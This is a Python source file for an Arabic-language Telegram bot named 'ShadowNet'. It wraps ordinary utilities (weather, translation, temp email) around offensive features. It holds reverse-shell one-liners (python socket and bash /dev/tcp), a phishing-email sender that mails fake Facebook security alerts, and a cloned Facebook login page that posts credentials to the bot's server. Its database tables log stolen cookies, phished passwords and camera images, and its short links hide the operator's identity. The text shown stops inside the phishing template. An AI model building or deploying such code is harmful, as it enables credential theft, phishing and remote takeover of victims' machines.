#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowNet v21.0 - النسخة النهائية مع روابط مختصرة صامتة
- كل الروابط لا تكشف معرف المطور
- روابط مثل: /c?t=aB3xK9mN بدل /camera_hack?id=7965377136
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import threading
import random
import smtplib
import base64
import warnings
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from io import BytesIO
from collections import defaultdict, deque

warnings.filterwarnings('ignore')
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== الاستيرادات =====
try:
    import requests
    from flask import (
        Flask, request, jsonify, render_template_string,
        redirect, send_from_directory, Response
    )
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS
    import psutil
except ImportError as e:
    print(f"❌ مكتبة مفقودة: {e}")
    sys.exit(1)

try:
    import nmap
    NMAP_AVAILABLE = True
except:
    NMAP_AVAILABLE = False

try:
    from scapy.all import ARP, Ether, srp, send
    SCAPY_AVAILABLE = True
except:
    SCAPY_AVAILABLE = False

# ===================== الإعدادات =====================
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
if not TOKEN:
    print("❌ خطأ: TELEGRAM_BOT_TOKEN غير مُعيَّن!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', '7965377136'))
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', '').rstrip('/') or 'https://my-t99-bot.onrender.com'
PORT = int(os.environ.get('PORT', '5000'))
API_KEY = secrets.token_hex(32)

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
SMTP_USER = os.environ.get('SMTP_USER', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')

# ===================== الحالة العامة =====================
STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_EXPIRY = 600

state_lock = threading.Lock()
db_lock = threading.Lock()
_bot_info_cache = {'username': None, 'id': None}

# ===================== Rate Limiter =====================
class RateLimiter:
    def __init__(self):
        self.user_requests = defaultdict(lambda: deque(maxlen=200))
        self.ip_requests = defaultdict(lambda: deque(maxlen=500))
        self.lock = threading.Lock()

    def check_user(self, user_id, max_per_minute=30, is_admin=False):
        now = time.time()
        window = 60
        limit = max_per_minute * (10 if is_admin else 1)
        with self.lock:
            dq = self.user_requests[user_id]
            while dq and dq[0] < now - window:
                dq.popleft()
            if len(dq) >= limit:
                return False
            dq.append(now)
            return True

    def check_ip(self, ip, max_per_minute=60):
        now = time.time()
        window = 60
        with self.lock:
            dq = self.ip_requests[ip]
            while dq and dq[0] < now - window:
                dq.popleft()
            if len(dq) >= max_per_minute:
                return False
            dq.append(now)
            return True

    def get_user_stats(self, user_id):
        with self.lock:
            return len(self.user_requests.get(user_id, []))

rate_limiter = RateLimiter()

# ===================== Metrics =====================
class Metrics:
    def __init__(self):
        self.counters = defaultdict(int)
        self.started_at = datetime.now()
        self.lock = threading.Lock()

    def inc(self, name, amount=1):
        with self.lock:
            self.counters[name] += amount

    def snapshot(self):
        with self.lock:
            return {
                'uptime_seconds': int((datetime.now() - self.started_at).total_seconds()),
                'started_at': self.started_at.isoformat(),
                'counters': dict(self.counters),
                'active_users_cached': len(rate_limiter.user_requests)
            }

metrics = Metrics()

# ===================== الكائنات =====================
app = Flask(__name__)
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== المتغيرات العامة =====================
user_states = {}
user_emails = {}
pdf_texts = {}
user_voice_selection = {}

# ===================== التسجيل =====================
class JsonFormatter(logging.Formatter):
    def format(self, record):
        log = {
            'ts': datetime.utcnow().isoformat() + 'Z',
            'level': record.levelname,
            'logger': record.name,
            'msg': record.getMessage()
        }
        if record.exc_info:
            log['exception'] = self.formatException(record.exc_info)
        return json.dumps(log, ensure_ascii=False)

handler = logging.StreamHandler()
handler.setFormatter(JsonFormatter())
logger = logging.getLogger('shadownet')
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logger.propagate = False

for noisy in ['werkzeug', 'telebot', 'urllib3']:
    logging.getLogger(noisy).setLevel(logging.WARNING)

# ===================== الثوابت =====================
QUOTES_DB = {
    "حكمة": [
        "لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك.",
        "من جدّ وجد، ومن زرع حصد.",
    ],
    "تحفيز": [
        "توقف عن مقارنة بدايتك بنهاية غيرك.",
        "كل يوم هو فرصة جديدة لتكون أفضل.",
    ]
}
DUAA_DB = [
    {"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر والتقوى.", "source": "صحيح مسلم"},
]
VOICES = {"مصري": "ar", "مصرية": "ar", "سعودية": "ar"}

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def get_db_conn():
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_db():
    with db_lock:
        conn = get_db_conn()
        try:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users (
                chat_id INTEGER PRIMARY KEY,
                is_admin INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                points INTEGER DEFAULT 10,
                referral_code TEXT UNIQUE,
                created_at TEXT,
                last_seen TEXT,
                username TEXT,
                first_name TEXT,
                can_use_collector INTEGER DEFAULT 0,
                can_use_camera INTEGER DEFAULT 0,
                can_use_phishing INTEGER DEFAULT 0,
                can_use_advanced INTEGER DEFAULT 0
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS user_activity (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER, action TEXT, timestamp TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS points_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_email TEXT, platform TEXT, username TEXT,
                password TEXT, ip TEXT, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS short_urls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                original_url TEXT, short_code TEXT UNIQUE, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS short_tokens (
                token TEXT PRIMARY KEY,
                chat_id INTEGER NOT NULL,
                created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS camera_images (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER, image BLOB, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS stolen_cookies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id TEXT, url TEXT, cookie_name TEXT,
                cookie_value TEXT, technique TEXT, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS hack_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id TEXT, command TEXT, output TEXT, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS clickfix_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id TEXT, command TEXT, executed INTEGER DEFAULT 0, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS account_dumpling_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_email TEXT, platform TEXT, status TEXT, created_at TEXT
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS device_info_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id TEXT, ip TEXT, report TEXT, created_at TEXT
            )''')

            for col in [
                "ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0",
                "ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0",
                "ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0",
                "ALTER TABLE users ADD COLUMN username TEXT",
                "ALTER TABLE users ADD COLUMN first_name TEXT",
            ]:
                try:
                    c.execute(col)
                except sqlite3.OperationalError:
                    pass

            c.execute("""INSERT OR IGNORE INTO users
                (chat_id, is_admin, points, created_at, can_use_collector,
                 can_use_camera, can_use_phishing, can_use_advanced)
                VALUES (?, 1, 999999, ?, 1, 1, 1, 1)""",
                (ADMIN_ID, datetime.now().isoformat()))
            c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
            conn.commit()
        finally:
            conn.close()

# ===================== دوال DB =====================
def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        with db_lock:
            conn = get_db_conn()
            try:
                c = conn.cursor()
                c.execute(query, params)
                result = c.fetchone() if fetch_one else c.fetchall()
                return result if result is not None else default
            finally:
                conn.close()
    except Exception as e:
        logger.error(f"DB query error: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        with db_lock:
            conn = get_db_conn()
            try:
                c = conn.cursor()
                c.execute(query, params)
                conn.commit()
                return True
            finally:
                conn.close()
    except Exception as e:
        logger.error(f"DB execute error: {e}")
        return False

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    return int(chat_id) == ADMIN_ID

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def get_user_points(chat_id):
    if is_admin(chat_id):
        return 999999
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    if is_admin(chat_id):
        return True
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_camera(chat_id):
    if is_admin(chat_id):
        return True
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_phishing(chat_id):
    if is_admin(chat_id):
        return True
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_advanced(chat_id):
    if is_admin(chat_id):
        return True
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def check_points(chat_id, amount, reason="استخدام ميزة"):
    if is_admin(chat_id):
        return True
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute(
            "INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
            (chat_id, -amount, reason, datetime.now().isoformat())
        )
        return True
    return False

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute(
            "INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
            (chat_id, amount, reason, datetime.now().isoformat())
        )
        return True
    return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup,
                                parse_mode=parse_mode, timeout=30)
    except Exception as e:
        logger.error(f"safe_send error for {chat_id}: {e}")
        return None

def notify_admin(msg):
    try:
        bot.send_message(ADMIN_ID, f"📢 {msg}", timeout=15)
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def log_activity(chat_id, action):
    safe_db_execute(
        "INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
        (chat_id, action[:200], datetime.now().isoformat())
    )

def update_last_seen(chat_id):
    safe_db_execute(
        "UPDATE users SET last_seen = ? WHERE chat_id = ?",
        (datetime.now().isoformat(), chat_id)
    )

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

def ensure_user(chat_id, username=None, first_name=None):
    safe_db_execute(
        "INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, username, first_name) VALUES (?, 0, 10, ?, ?, ?)",
        (chat_id, datetime.now().isoformat(), username, first_name)
    )
    if username or first_name:
        safe_db_execute(
            "UPDATE users SET username = COALESCE(?, username), first_name = COALESCE(?, first_name) WHERE chat_id = ?",
            (username, first_name, chat_id)
        )

def get_bot_username():
    global _bot_info_cache
    if _bot_info_cache['username']:
        return _bot_info_cache['username']
    try:
        me = bot.get_me()
        _bot_info_cache['username'] = me.username
        _bot_info_cache['id'] = me.id
        return me.username
    except Exception as e:
        logger.error(f"get_bot_username error: {e}")
        return None

# ===================== نظام الروابط القصيرة الصامتة =====================
def get_or_create_token(chat_id):
    """يولّد كود قصير فريد لكل مستخدم لإخفاء معرّفه"""
    try:
        row = safe_db_query(
            "SELECT token FROM short_tokens WHERE chat_id = ? LIMIT 1",
            (chat_id,)
        )
        if row and row[0]:
            return row[0]

        for _ in range(10):
            token = ''.join(random.choices(
                string.ascii_letters + string.digits, k=10
            ))
            exists = safe_db_query(
                "SELECT 1 FROM short_tokens WHERE token = ?", (token,)
            )
            if not exists:
                ok = safe_db_execute(
                    "INSERT INTO short_tokens (token, chat_id, created_at) VALUES (?, ?, ?)",
                    (token, chat_id, datetime.now().isoformat())
                )
                if ok:
                    return token
        return None
    except Exception as e:
        logger.error(f"get_or_create_token error: {e}")
        return None

def resolve_token(token):
    """يحوّل الكود القصير إلى chat_id"""
    if not token:
        return None
    try:
        row = safe_db_query(
            "SELECT chat_id FROM short_tokens WHERE token = ?", (token,)
        )
        return row[0] if row else None
    except Exception as e:
        logger.error(f"resolve_token error: {e}")
        return None

def get_short_link(path, chat_id):
    """يبني رابطاً قصيراً بدون كشف معرّف المستخدم"""
    token = get_or_create_token(chat_id)
    if not token:
        return f"{SERVER_URL}/{path}?t=err"
    return f"{SERVER_URL}/{path}?t={token}"

def extract_chat_id(req):
    """يستخرج chat_id من الرابط (يدعم الطريقتين: id= و t=)"""
    token = req.args.get('t')
    if token:
        cid = resolve_token(token)
        if cid:
            return cid
    return req.args.get('id')

# ===================== الخدمات =====================
def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', '?')
            temp_c = current.get('temp_C', '?')
            feels_like = current.get('FeelsLikeC', '?')
            humidity = current.get('humidity', '?')
            wind_speed = current.get('windSpeedKmph', '?')
            pressure = current.get('pressure', '?')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', '?')
            min_temp = forecast.get('mintempC', '?')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', '?')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', '?')
            now = datetime.now().strftime("%I:%M %p")
            msg = (
                f"🌤️ <b>الطقس في {city}</b>\n"
                f"────────────────────\n"
                f"<b>الحالة</b> : {weather_desc}\n"
                f"<b>الحرارة</b> : {temp_c}°C (محسوسة {feels_like}°C)\n"
                f"<b>المدى</b> : {min_temp}° / {max_temp}°\n"
                f"<b>الرطوبة</b> : {humidity}%\n"
                f"<b>الرياح</b> : {wind_speed} كم/س\n"
                f"<b>الضغط</b> : {pressure} hPa\n\n"
                f"🌅 {sunrise}  |  🌇 {sunset}\n"
                f"⏱️ {now}"
            )
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        return "❌ فشل جلب الطقس، تحقق من اسم المدينة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:100]}"

def translate_to_english(text):
    try:
        if re.search(r'[\u0600-\u06FF]', text):
            translator = GoogleTranslator(source='auto', target='en')
            return translator.translate(text)
        return text
    except Exception as e:
        logger.warning(f"translate_to_english error: {e}")
        return text

def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(16))
        if (re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd)
                and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%^&*]", pwd)):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("اجعلها 12 حرفاً على الأقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("أضف حرفاً كبيراً A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("أضف حرفاً صغيراً a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("أضف رقماً 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("أضف رمزاً !@#$%")
    if score <= 2: strength, time_taken = "ضعيفة جداً 🔴", "أقل من ثانية"
    elif score <= 4: strength, time_taken = "متوسطة 🟡", "عدة ساعات"
    else: strength, time_taken = "قوية جداً 🟢", "مليارات السنين"
    return strength, time_taken, score, feedback

# ===================== توليد الصور =====================
def generate_image(prompt, max_retries=3):
    english_prompt = translate_to_english(prompt)
    quality_suffix = ", high quality, detailed, professional, 4k, sharp focus, cinematic lighting"
    if len(english_prompt) < 100 and 'high quality' not in english_prompt.lower():
        english_prompt = english_prompt + quality_suffix

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/120.0 Safari/537.36',
        'Accept': 'image/*,*/*;q=0.8'
    }
    safe_prompt = requests.utils.quote(english_prompt[:300])

    endpoints = [
        f"https://image.pollinations.ai/prompt/{safe_prompt}?width=1024&height=1024&nologo=true&enhance=true&model=flux",
        f"https://image.pollinations.ai/prompt/{safe_prompt}?width=1024&height=1024&nologo=true&model=turbo",
        f"https://image.pollinations.ai/prompt/{safe_prompt}?width=1024&height=1024&nologo=true",
    ]

    logger.info(f"🎨 Image prompt (EN): {english_prompt[:120]}")

    for attempt in range(max_retries):
        for url in endpoints:
            try:
                response = requests.get(url, headers=headers, timeout=120, verify=False)
                if response.status_code != 200:
                    continue
                content_type = response.headers.get('Content-Type', '')
                if not content_type.startswith('image/'):
                    continue
                if len(response.content) < 2048:
                    continue
                bio = BytesIO(response.content)
                bio.name = 'generated.jpg'
                metrics.inc('image_generation_success')
                return bio
            except Exception as e:
                logger.warning(f"Image attempt {attempt + 1} failed: {e}")
                continue
        time.sleep(3)

    metrics.inc('image_generation_failure')
    return None

def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        voice_bytes.name = 'voice.mp3'
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute(
            "INSERT OR IGNORE INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)",
            (url, code, datetime.now().isoformat())
        )
        return f"{SERVER_URL}/s/{code}"
    except:
        return None

def expand_url(short_url):
    try:
        code = short_url.rstrip('/').split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        return row[0] if row else None
    except:
        return None

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ الرقم غير صالح."
        country = geocoder.description_for_number(parsed, "ar") or "غير معروف"
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        timezones = timezone.time_zones_for_number(parsed)
        return (
            f"📱 <b>معلومات الرقم</b> {number}\n"
            f"🌍 البلد: {country}\n"
            f"📡 المشغل: {carrier_name}\n"
            f"🕐 المناطق: {', '.join(timezones)}"
        )
    except Exception as e:
        return f"❌ خطأ: {str(e)[:100]}"

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {
            'outtmpl': 'downloads/%(id)s.%(ext)s',
            'format': 'best[ext=mp4]/best[height<=720]/best',
            'quiet': True, 'no_warnings': True, 'ignoreerrors': True,
            'no_check_certificate': True, 'socket_timeout': 30,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                vid_id = info.get('id', '')
                for f in os.listdir('downloads'):
                    if vid_id and vid_id in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:200]

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            extracted = page.extract_text()
            if extracted:
                text += extracted + "\n"
        return text.strip() or "لا يوجد نص."
    except ImportError:
        return "❌ مكتبة pypdf غير مثبتة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:100]}"

def check_link_no_api(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        response = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        return {"status": "ok", "message": f"✅ الرابط يعمل ({response.status_code})"}
    except Exception as e:
        return {"status": "error", "message": f"❌ فشل: {str(e)[:80]}"}

# ===================== البريد المؤقت =====================
def create_temp_email():
    try:
        r = requests.get('https://api.mail.tm/domains', timeout=15)
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        domains_data = r.json()
        members = domains_data.get('hydra:member') or domains_data.get('data') or []
        if not members:
            return None, "لا توجد نطاقات متاحة"
        domain = members[0].get('domain') or members[0].get('name')

        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        address = f'{user}@{domain}'
        password = secrets.token_hex(8)

        r = requests.post('https://api.mail.tm/accounts', json={
            'address': address, 'password': password
        }, timeout=20)
        if r.status_code not in (200, 201):
            return None, f"فشل الإنشاء: {r.status_code}"

        r = requests.post('https://api.mail.tm/token', json={
            'address': address, 'password': password
        }, timeout=20)
        if r.status_code != 200:
            return None, f"فشل التوكن: {r.status_code}"

        token = r.json().get('token')
        return {'address': address, 'password': password, 'token': token}, None
    except Exception as e:
        return None, str(e)[:150]

def fetch_temp_emails(chat_id):
    if chat_id not in user_emails:
        return None, "لا يوجد بريد نشط"
    info = user_emails[chat_id]
    try:
        r = requests.get('https://api.mail.tm/messages',
                        headers={'Authorization': f'Bearer {info["token"]}'},
                        timeout=15)
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        data = r.json()
        return data.get('hydra:member', []), None
    except Exception as e:
        return None, str(e)[:150]

def read_temp_email(chat_id, msg_id):
    if chat_id not in user_emails:
        return None, "لا يوجد بريد نشط"
    info = user_emails[chat_id]
    try:
        r = requests.get(f'https://api.mail.tm/messages/{msg_id}',
                        headers={'Authorization': f'Bearer {info["token"]}'},
                        timeout=15)
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        return r.json(), None
    except Exception as e:
        return None, str(e)[:150]

# ===================== أدوات المطور =====================
def vuln_agent_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت."
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-sV -T4 --top-ports 100')
        if target not in nm.all_hosts():
            return f"❌ {target} غير متاح."
        msg = f"🔍 <b>نتائج فحص {target}</b>\n"
        found = False
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                if nm[target][proto][port].get('state') == 'open':
                    svc = nm[target][proto][port].get('name', '?')
                    msg += f"• {port}/{proto} - {svc}\n"
                    found = True
        return msg if found else f"✅ لا منافذ مفتوحة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def osint_d2_search(target):
    try:
        results = [f"🕵️ <b>استطلاع {target}</b>"]
        try:
            info = whois.whois(target)
            if info.creation_date: results.append(f"📅 التسجيل: {info.creation_date}")
            if info.registrar: results.append(f"🏢 المُسجل: {info.registrar}")
        except: pass
        for record in ['A', 'MX', 'NS', 'TXT']:
            try:
                answers = dns.resolver.resolve(target, record, lifetime=5)
                if answers:
                    results.append(f"🔹 {record}: {answers[0].to_text()[:100]}")
            except: pass
        return "\n".join(results) if len(results) > 1 else f"🔍 لا معلومات."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def py_netrecon_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت."
    try:
        nm = nmap.PortScanner()
        nm.scan(target, '1-1000', arguments='-sS -T4 --open')
        if target not in nm.all_hosts():
            return f"❌ {target} غير متاح."
        msg = f"🌐 <b>منافذ {target}</b>\n"
        found = False
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                if nm[target][proto][port]['state'] == 'open':
                    msg += f"✅ {port}/{proto}\n"
                    found = True
        return msg if found else "🔒 لا منافذ مفتوحة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def exploit_dev_generate(target_ip, language='python'):
    payloads = {
        'python': f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{target_ip}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
        'bash': f'bash -c "bash -i >& /dev/tcp/{target_ip}/4444 0>&1"',
    }
    return payloads.get(language, payloads['python'])

def generate_clickfix_command(target_name="مستخدم"):
    templates = [
        f'powershell -Command "Write-Host \'✅ تم إصلاح المشكلة لـ {target_name}!\' -ForegroundColor Green; pause"',
        f'cmd /c "echo ✅ تم التحديث بنجاح لـ {target_name} & pause"',
    ]
    return random.choice(templates)

def send_phishing_email(target_email, platform, custom_message=None):
    if not SMTP_USER:
        return "❌ SMTP غير مضبوط."
    try:
        html_content = custom_message or generate_account_dumpling_email(target_email)
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمان - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(html_content, 'html', 'utf-8'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return f"✅ تم الإرسال إلى {target_email}"
    except Exception as e:
        return f"❌ فشل: {str(e)[:200]}"

def generate_account_dumpling_email(target_email):
    return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="font-family:Arial;direction:rtl;padding:20px;background:#f5f5f5;">
<div style="max-width:600px;margin:auto;background:#fff;padding:30px;border-radius:8px;">
<h2 style="color:#1877f2;">🔒 تأكيد أمان حسابك</h2>
<p>نلاحظ نشاطاً غير معتاد. لتأكيد هويتك:</p>
<p style="text-align:center;">
<a href="{SERVER_URL}/phishing_pages/facebook" style="background:#1877f2;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">تأكيد</a>
</p></div></body></html>'''
  # ===================== قوالب التصيد =====================
PHISHING_TEMPLATES = {
    'facebook': '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>فيسبوك - تسجيل الدخول</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
html,body{width:100%;height:100vh;background:#fff;overflow:hidden;display:flex;justify-content:center;align-items:center}
.container{width:100%;max-width:420px;height:100vh;padding:0 16px;display:flex;flex-direction:column;align-items:center;justify-content:space-between}
.top-section{width:100%;display:flex;flex-direction:column;align-items:center;padding-top:12px}
.language-selector{width:100%;display:flex;justify-content:center;padding:4px 0;font-size:14px;color:#1C1E21}
.language-selector span::after{content:"\\25BE";font-size:12px;margin-right:4px}
.logo-circle{width:58px;height:58px;border-radius:50%;display:flex;justify-content:center;align-items:center;margin:4px 0 14px;border:1px solid #dddfe2}
.logo-circle span{font-size:40px;font-weight:700;color:#1877F2;line-height:1}
.form-group{width:100%;margin-bottom:12px}
.form-group input{width:100%;height:50px;padding:0 16px;border:1px solid #CCD0D5;border-radius:25px;font-size:15px;outline:none}
.form-group input:focus{border-color:#1877F2}
.form-group input::placeholder{color:#90949C}
.login-btn{width:100%;height:50px;background:#1877F2;border:none;border-radius:25px;font-size:16px;font-weight:600;color:#fff;cursor:pointer;margin-top:4px}
.forgot-link{display:block;margin:18px 0 16px;font-size:14px;color:#1C1E21;text-decoration:none;text-align:center}
.bottom-section{width:100%;display:flex;flex-direction:column;align-items:center;padding-bottom:20px}
.create-btn{width:100%;height:50px;background:transparent;border:2px solid #1877F2;border-radius:25px;font-size:16px;color:#1877F2;cursor:pointer;margin-bottom:14px}
.meta-footer{display:flex;align-items:center;gap:6px;font-size:14px;color:#1C1E21}
.meta-footer .infinity{color:#1877F2;font-size:22px;font-weight:700}
</style></head><body>
<div class="container">
<div class="top-section">
<div class="language-selector"><span>العربية</span></div>
<div class="logo-circle"><span>f</span></div>
<form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
<input type="hidden" name="platform" value="facebook">
<div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف أو البريد" required autofocus></div>
<div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
<button type="submit" class="login-btn">تسجيل الدخول</button>
</form>
<a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
</div>
<div class="bottom-section">
